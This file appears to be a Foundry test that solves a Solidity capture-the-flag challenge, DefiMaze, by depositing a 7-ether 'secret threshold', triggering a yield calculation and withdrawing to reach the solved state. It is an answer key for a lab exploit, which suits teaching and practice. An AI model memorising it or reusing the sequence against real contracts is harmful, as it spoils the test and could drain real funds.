// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {SetUp, DeFiPlatform, Vault} from "../src/DefiMaze/SetUp.sol";

contract DefiMazeTest is Test {
    SetUp private deployer;

    function setUp() external {
        deployer = new SetUp();
    }

    function test_hackDefiMaze() external {
        DeFiPlatform platfrom = deployer.platfrom();

        uint256 secretThreshold = 7 ether;
        platfrom.depositFunds{value: secretThreshold}(secretThreshold);
        platfrom.calculateYield(0, 0, 0);
        platfrom.requestWithdrawal(secretThreshold);
        deployer.vault().isSolved();

        assertTrue(deployer.isSolved());
    }
}
